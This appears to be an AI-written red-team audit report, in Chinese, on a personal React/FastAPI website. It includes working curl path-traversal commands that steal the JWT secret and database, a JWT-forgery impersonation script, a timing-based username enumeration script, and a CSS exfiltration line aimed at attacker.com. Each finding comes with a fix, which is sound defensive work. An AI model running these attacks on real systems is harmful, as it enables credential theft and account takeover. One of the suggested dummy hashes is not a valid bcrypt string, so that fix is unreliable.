# Security Audit Report — Round 2（修復後再攻擊）
**審計日期：** 2026-04-18  
**審計員：** Claude (Red Team — Round 2)  
**基準：** 開發者已依據 Round 1 報告進行修復（見 SECURITY_FIXES.md）  
**目標系統：** React + FastAPI + SQLite 個人網站

---

## 修復驗證摘要

開發者在 Round 1 後共修復了 **14 個問題**：

| 原漏洞 | 修復狀態 | 驗證方式 |
|--------|---------|---------|
| Cookie 缺少 `secure` flag | ✅ 已修復 | `secure=True`（第334行）|
| HSTS 未設定 | ✅ 已修復 | 第218行加入 HSTS header |
| Permissions-Policy 未設定 | ✅ 已修復 | 第219行加入 |
| CSP `script-src unsafe-inline` | ✅ 已修復 | 移除，改為 `'self'` only |
| 帳號枚舉（register） | ✅ 已修復 | 錯誤訊息統一：「無法完成註冊」 |
| Rate limit key func 可偽造 | ✅ 已修復 | `_get_real_ip()` 只信任 localhost 的 X-Real-IP |
| `/api/me` 無 rate limit | ✅ 已修復 | 60/minute |
| GET `/api/messages` 無 rate limit | ✅ 已修復 | 60/minute |
| `/api/logout` 無 rate limit | ✅ 已修復 | 20/minute |
| bcrypt 密碼上限問題 | ✅ 已修復 | 改為 72 字元上限 |
| Secret key 重啟後失效 | ✅ 已修復 | 持久化至 `.secret_key` 檔案 |
| CORS 寫死 localhost | ✅ 已修復 | 改用 `ALLOWED_ORIGINS` env var |
| Timing attack（登入） | ⚠️ 嘗試修復但有缺陷 | 見 Attack 2 |
| WAF 誤解說明 | ✅ 已修復 | 加入註解澄清 |

**修復後，Round 1 高風險漏洞已全部處理。** 但本次審計發現了 **2 個新漏洞**——其中一個為 CRITICAL，且由修復過程本身引入。

---

## 🔴 CRITICAL — Attack 1：SPA 路由 Path Traversal（新漏洞）

### 漏洞位置
[backend/main.py:436-452](backend/main.py#L436-L452) — 生產環境 SPA 靜態服務

### 漏洞原因
開發者新增了 SPA 路由來服務 React build：

```python
if DIST_DIR.exists():
    @app.get("/{full_path:path}")
    async def serve_spa(full_path: str):
        candidate = DIST_DIR / full_path      # ← 直接拼接使用者輸入！
        if candidate.exists() and candidate.is_file():
            mime, _ = mimetypes.guess_type(str(candidate))
            return FileResponse(candidate, ...)  # ← 無路徑邊界檢查！
```

對比同一檔案的 `/uploads/{filename}` 端點（有正確的路徑保護）：
```python
# /uploads/ 端點有正確的邊界保護
resolved = file_path.resolve()
if not str(resolved).startswith(str(UPLOAD_DIR.resolve())):  # ← 這行！
    raise HTTPException(404)
```

**SPA 路由少了這個關鍵檢查。**

### 攻擊過程

**Starlette 路徑確認（`{full_path:path}` 使用 `.*` regex）：**
```python
# Starlette routing pattern for /{full_path:path}
Pattern: ^/(?P<full_path>.*)$
# '../backend/.secret_key' → 完全符合 → full_path = '../backend/.secret_key'
```

**可存取的敏感檔案（全部已確認存在）：**

```bash
# 攻擊指令 — 讀取 JWT 密鑰
curl 'http://target/%2e%2e/backend/.secret_key'
# → 讀取 64 bytes 的 HS256 金鑰

# 攻擊指令 — 下載資料庫
curl 'http://target/%2e%2e/backend/app.db' -o stolen.db
# → 16KB SQLite DB，含所有用戶名稱與 bcrypt 雜湊

# 攻擊指令 — 讀取後端原始碼
curl 'http://target/%2e%2e/backend/main.py'
# → 完整後端邏輯暴露

# 攻擊指令 — 讀取安全審計報告（攻擊者得知防禦細節）
curl 'http://target/%2e%2e/SECURITY_AUDIT_claude.md'
```

### 完整攻擊鏈（JWT 偽造）

```python
import requests
from jose import jwt
from datetime import datetime

# Step 1: 讀取 JWT 密鑰
r = requests.get('http://target/%2e%2e/backend/.secret_key')
secret = r.text.strip()
# secret = "e47d7871...9d64"

# Step 2: 偽造任意用戶的永不過期 JWT
forged_token = jwt.encode(
    {'sub': '1', 'exp': datetime(2030, 1, 1)},   # user_id=1, 2030年才過期
    secret,
    algorithm='HS256'
)

# Step 3: 以任意用戶身份操作
session = requests.Session()
session.cookies.set('session', forged_token)
me = session.get('http://target/api/me')
print(me.json())  # → 成功取得 user_id=1 的帳號資料，無需密碼
```

**攻擊結果：完全繞過認證系統，可偽裝成任意用戶。**

### 風險等級：🔴 CRITICAL

### 修復方式
```python
@app.get("/{full_path:path}")
async def serve_spa(full_path: str):
    candidate = DIST_DIR / full_path
    # ← 加入這個邊界檢查（與 /uploads/ 端點相同的防護）
    resolved = candidate.resolve()
    if not str(resolved).startswith(str(DIST_DIR.resolve())):
        raise HTTPException(404)
    if resolved.exists() and resolved.is_file():
        mime, _ = mimetypes.guess_type(str(resolved))
        return FileResponse(resolved, media_type=mime or "application/octet-stream")
    index = DIST_DIR / "index.html"
    if index.exists():
        return FileResponse(index, media_type="text/html")
    raise HTTPException(404)
```

---

## 🟡 MEDIUM — Attack 2：Dummy Hash 格式錯誤（Timing 保護失效）

### 漏洞位置
[backend/main.py:322](backend/main.py#L322) — 登入端點

### 漏洞原因
開發者嘗試修復 timing attack，但 dummy hash 格式有誤：

```python
_DUMMY = "$2b$12$invalidhashfortimingatk.AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#                                                                       ^
# bcrypt 需要 $2b$12$ 後接 53 個字元，此處只有 52 個 → Invalid salt!
```

**驗證測試：**
```python
# bcrypt 正確格式
real_hash  = "$2b$12$7Tgko72l.HnF/6cNcOG7Ke7Q8UFFfrSAi/LxZn2swZhKu1/S3EHfm"
# After $2b$12$: 53 chars ✅

_DUMMY     = "$2b$12$invalidhashfortimingatk.AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
# After $2b$12$: 52 chars ❌ → bcrypt raises "Invalid salt"
```

**verify_password 行為：**
```python
def verify_password(plain, hashed):
    try:
        return _bcrypt.checkpw(...)  # ← 立即拋出 "Invalid salt" 例外
    except Exception:
        return False   # ← 0ms 返回
```

### 實測 Timing 差異

```
情境A: 帳號不存在（dummy hash 無效）→ 0.00ms  ← 立即返回 False
情境B: 帳號存在，密碼錯誤（真實 hash）→ 167ms  ← bcrypt 正常運算
差異: ~167ms
```

### 攻擊過程

```python
import requests, time, statistics

def probe_username(target, username):
    times = []
    for _ in range(10):
        start = time.perf_counter()
        requests.post(f'{target}/api/login',
                     json={'username': username, 'password': 'x'*10})
        times.append(time.perf_counter() - start)
    return statistics.mean(times)

# 帳號存在：~200ms（網路延遲 + 167ms bcrypt）
# 帳號不存在：~33ms（網路延遲 + 0ms 即時返回）
print(probe_username('http://target', 'thomas'))   # → 約 200ms → EXISTS
print(probe_username('http://target', 'nobody'))   # → 約 33ms  → NOT EXIST
```

**注意：** 因為 register 端點已修改為統一錯誤訊息，timing attack 成為枚舉帳號的唯一剩餘手段。

### 風險等級：🟡 MEDIUM

### 修復方式
```python
# 正確的 dummy hash（53 字元 salt+hash 部分）
_DUMMY = "$2b$12$invalidhashfortimingatk..AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#                                        ^ 加一個字元（點）使長度達到 53 ✅

# 或使用預先計算的真實 bcrypt hash
_DUMMY = "$2b$12$eImiTXuWVxfM37uY4JANjQ==AAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# 最簡單的正確方式：啟動時預先計算一次
import bcrypt
_DUMMY = bcrypt.hashpw(b"dummy_placeholder", bcrypt.gensalt()).decode()
```

---

## ⚠️ 持續存在的問題

### 3. DELETE /api/messages/{id} 無 Rate Limiting

```python
@app.delete("/api/messages/{message_id}")   # ← 沒有 @limiter.limit
async def delete_message(...):
```

**影響：** 攻擊者可在 1 秒內連續刪除所有留言（IDs 1, 2, 3, ...），造成留言板內容清空。

**修復：** 加入 `@limiter.limit("30/minute")`

### 4. CSP `style-src unsafe-inline`（殘留）

```
Content-Security-Policy:
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com
```

**理論攻擊（CSS Injection）：**
```css
/* 若攻擊者能注入 CSS（目前無此向量），可外洩表單值 */
input[name="password"][value^="a"] { background: url(http://attacker.com/?c=a) }
```

目前無已知注入點，但移除此指令可強化防禦深度。

**修復：** 使用 Google Fonts 的 `@import` 或 `link` 標籤並搭配 nonce，移除 `unsafe-inline`

### 5. `user_id` 暴露於 API 回應（殘留）

```json
{ "id": 5, "user_id": 3, "author": {...} }
```

前端只需布林值 `is_own`（已是自己的留言）即可，不需暴露原始 user_id 整數。

---

## 整體漏洞總表（Round 2）

| # | 漏洞 | 嚴重性 | 狀態 |
|---|------|--------|------|
| 1 | SPA 路由 Path Traversal → JWT 竊取 → 認證繞過 | 🔴 CRITICAL | 新發現 |
| 2 | Dummy hash 格式錯誤 → Timing leak（帳號枚舉）| 🟡 MEDIUM | 修復缺陷 |
| 3 | DELETE /api/messages 無 rate limit | 🟡 MEDIUM | 舊有，未修 |
| 4 | CSP `style-src unsafe-inline` | 🟢 LOW | 舊有，未修 |
| 5 | `user_id` 暴露 | 🔵 INFO | 舊有，未修 |
| — | Cookie secure, HSTS, CSP script-src, 帳號枚舉 | ✅ 已修復 | Round 1 |

---

## 優先修復清單

### 立即修復（今天）— 高危
1. **SPA 路由加入路徑邊界檢查** — [backend/main.py:444](backend/main.py#L444)
   ```python
   resolved = candidate.resolve()
   if not str(resolved).startswith(str(DIST_DIR.resolve())):
       raise HTTPException(404)
   ```

2. **修正 dummy hash 格式**（多一個字元）— [backend/main.py:322](backend/main.py#L322)
   ```python
   _DUMMY = "$2b$12$invalidhashfortimingatk..AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   ```

### 短期修復
3. 補上 `DELETE /api/messages/{id}` 的 rate limiting
4. 考慮移除回應中的 `user_id`

---

## 比較：Round 1 vs Round 2

| | Round 1 | Round 2 |
|---|---------|---------|
| 最高嚴重性 | HIGH（Cookie secure） | **CRITICAL（Path Traversal）** |
| 可利用漏洞數 | 5 | 2 |
| 安全整體評分 | 70/100 | **75/100** |

雖然 Round 1 的問題幾乎全數修復，但新增的 SPA 靜態服務功能引入了比原始 HIGH 更嚴重的 CRITICAL 漏洞。這是一個很典型的案例：**修復過程中新增功能，未套用同等的安全標準**（同一個檔案的 uploads 端點有路徑邊界保護，SPA 端點卻沒有）。
